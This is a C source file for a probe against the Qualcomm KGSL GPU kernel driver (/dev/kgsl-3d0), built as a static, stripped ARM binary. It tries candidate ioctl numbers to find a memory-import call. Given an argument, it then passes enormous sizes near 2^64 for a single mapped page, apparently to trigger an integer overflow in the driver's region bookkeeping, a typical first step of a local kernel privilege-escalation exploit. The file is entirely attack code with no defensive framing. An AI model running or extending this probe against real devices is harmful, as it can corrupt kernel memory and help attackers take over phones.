/* kgsl SVM import / region bookkeeping probe.
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define TYPE_ADDR 2

struct imp { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
struct ua  { uint64_t virtaddr; };

static void *fresh(size_t len){
    void *m=mmap(NULL,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(m!=MAP_FAILED) memset(m,0x41,len);
    return m;
}

static int do_import(int fd,int nr,void *m,unsigned long long sz,unsigned int *outid){
    struct imp p; memset(&p,0,sizeof p);
    struct ua u;  memset(&u,0,sizeof u);
    u.virtaddr=(uint64_t)(uintptr_t)m;
    p.priv=(uint64_t)(uintptr_t)&u;
    p.priv_len=sz;
    p.type=TYPE_ADDR;
    errno=0;
    int r=ioctl(fd,_IOWR(KGSL_IOC_TYPE,nr,struct imp),&p);
    if(outid) *outid=p.id;
    return r;
}

int main(int argc,char**argv){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("== kgsl SVM import probe (uid=%d) ==\n",(int)getuid());
    int fd=open(DEV,O_RDWR);
    if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }
    printf("[+] fd=%d\n",fd);

    unsigned int cand[]={0x48,0x29,0x28,0x2A,0x2B,0x27};
    int import_nr=-1;
    for(int i=0;i<6;i++){
        size_t len=0x1000; void *m=fresh(len); unsigned int id=0;
        errno=0; int r=do_import(fd,cand[i],m,len,&id);
        printf("  nr=0x%02x -> %d errno=%d(%s) id=%u\n",cand[i],r,errno,strerror(errno),id);
        if(r==0 && import_nr<0){ import_nr=(int)cand[i]; printf("  [+] IMPORT nr=0x%02x id=%u\n",cand[i],id); }
        munmap(m,len);
    }
    if(import_nr<0){ printf("[-] no import ioctl\n== done ==\n"); return 2; }

    int go = (argc>1);
    unsigned long long safe[]={0x2000ULL,0x100000ULL,0x40000000ULL};
    unsigned long long big[]={0xFFFFFFFFFFF00000ULL,0xFFFFFFFFFFFFF000ULL,0xFFFFFFFFFFFFE000ULL};
    unsigned long long *sizes = go?big:safe; int ns = go?3:3;
    for(int i=0;i<ns;i++){
        size_t len=0x1000; void *m=fresh(len); unsigned int id=0;
        errno=0; int r=do_import(fd,import_nr,m,sizes[i],&id);
        printf("  size=0x%llx -> %d errno=%d(%s) id=%u\n",sizes[i],r,errno,strerror(errno),id);
        munmap(m,len);
    }
    printf("== done ==\n");
    return 0;
}
